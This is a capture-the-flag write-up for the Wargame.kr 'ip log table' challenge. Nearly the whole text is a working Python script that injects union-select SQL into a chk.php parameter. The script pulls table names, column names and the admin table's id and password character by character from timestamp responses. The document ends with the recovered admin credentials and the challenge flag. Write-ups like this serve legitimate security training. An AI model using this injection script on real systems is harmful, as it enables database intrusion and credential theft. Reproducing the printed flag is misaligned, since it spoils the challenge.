# [Wargame.kr] ip log table - Writeup

## Blind SQL Injection

``` python
import urllib.parse, urllib.request
import time
import datetime

def get_table_list():
	data = ''
	for i in range(1,101):
		url = 'http://wargame.kr:8080/ip_log_table/chk.php'
		post_data = {
			'idx':"0 union select ascii(mid(group_concat(table_name),%d,1)) from information_schema.tables#" % (i+570)
		}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded'
		}

		req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
		res = urllib.request.urlopen(req).read().decode()

		t = res[res.find('<b>')+len('<b>'):res.find('</b>')]
		t = datetime.datetime.strptime(t, '%Y-%m-%d %H:%M:%S')

		default_time = time.mktime(datetime.datetime(1970, 1, 1, 9, 0, 0).timetuple())
		c = int(time.mktime(t.timetuple()) - default_time)
		if c == 0:
			break

		data += chr(c)
		print(data)

def get_column_list():
	data = ''
	for i in range(1,101):
		url = 'http://wargame.kr:8080/ip_log_table/chk.php'
		post_data = {
			'idx':"0 union select ascii(mid(group_concat(column_name),%d,1)) from information_schema.columns where table_name=0x61646D696E5F7461626C65#" % i
		}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded'
		}

		req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
		res = urllib.request.urlopen(req).read().decode()

		t = res[res.find('<b>')+len('<b>'):res.find('</b>')]
		t = datetime.datetime.strptime(t, '%Y-%m-%d %H:%M:%S')

		default_time = time.mktime(datetime.datetime(1970, 1, 1, 9, 0, 0).timetuple())
		c = int(time.mktime(t.timetuple()) - default_time)
		if c == 0:
			break

		data += chr(c)
		print(data)

def get_id_list_of_admin_table():
	data = ''
	for i in range(1,101):
		url = 'http://wargame.kr:8080/ip_log_table/chk.php'
		post_data = {
			'idx':"0 union select ascii(mid(group_concat(id),%d,1)) from admin_table#" % i
		}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded'
		}

		req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
		res = urllib.request.urlopen(req).read().decode()

		t = res[res.find('<b>')+len('<b>'):res.find('</b>')]
		t = datetime.datetime.strptime(t, '%Y-%m-%d %H:%M:%S')

		default_time = time.mktime(datetime.datetime(1970, 1, 1, 9, 0, 0).timetuple())
		c = int(time.mktime(t.timetuple()) - default_time)
		if c == 0:
			break

		data += chr(c)
		print(data)

def get_ps_list_of_admin_table():
	data = ''
	for i in range(1,101):
		url = 'http://wargame.kr:8080/ip_log_table/chk.php'
		post_data = {
			'idx':"0 union select ascii(mid(group_concat(ps),%d,1)) from admin_table#" % i
		}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded'
		}

		req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
		res = urllib.request.urlopen(req).read().decode()

		t = res[res.find('<b>')+len('<b>'):res.find('</b>')]
		t = datetime.datetime.strptime(t, '%Y-%m-%d %H:%M:%S')

		default_time = time.mktime(datetime.datetime(1970, 1, 1, 9, 0, 0).timetuple())
		c = int(time.mktime(t.timetuple()) - default_time)
		if c == 0:
			break

		data += chr(c)
		print(data)

def main():
	get_id_list_of_admin_table()
	get_ps_list_of_admin_table()

if __name__ == '__main__':
	main()
```
```
blue_admin
0h~myp4ss!
```

___

## Answer

flag: `a7a812c4d15f6a0f376f11e0119a9a313fc7e601`